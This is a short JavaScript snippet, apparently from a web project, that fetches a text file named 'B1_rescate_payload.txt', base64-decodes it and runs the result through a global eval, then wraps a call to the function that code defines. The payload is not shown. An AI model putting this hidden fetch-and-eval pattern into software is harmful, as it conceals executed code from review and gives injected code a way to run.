var __b1RescateReady=(async function(){var r=await fetch('B1_rescate_payload.txt');var t=await r.text();(0,eval)(atob(t.trim()));return true;})();
async function B1_ejecutarRescate(){await __b1RescateReady;return window.B1_ejecutarRescate.apply(window,arguments);}
